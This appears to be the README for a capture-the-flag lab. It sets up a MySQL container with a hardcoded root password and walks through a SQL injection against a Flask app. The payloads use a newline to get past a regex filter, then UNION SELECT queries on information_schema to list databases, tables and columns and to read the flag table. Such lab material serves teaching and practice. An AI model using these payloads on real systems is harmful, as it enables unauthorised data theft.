## Build the image

go to the mysql directory and run:

```docker build -t mysqlcustom .```

## run the container:

```docker run --rm -it -e MYSQL_ROOT_PASSWORD=shoshohN3Eishah8aegae4phiomoot7u -e MYSQL_DATABASE=flask -p 127.0.0.1:3306:3306 --name mysqlcustom mysqlcustom```

## exploit sqli

one possibility to get the flag (as of now, you have to break the regex by using a "\n"):

possible injection to display all products:

 ```\n%' or 'a'='a'; #```

how to get database names:

```\n%' or 'a'='a' union select group_concat(schema_name) from information_schema.schemata; #```

how to get table names:

```\n%' or 'a'='a' union select group_concat(table_name) from information_schema.tables where table_schema='flask'; #```

get column names of table 'flag':

```\n%' or 'a'='a' union select group_concat(column_name) from information_schema.columns where table_name='flag'; #```

get flag itself:

```\n%' or 'a'='a' union select group_concat(flag) from flask.flag; #```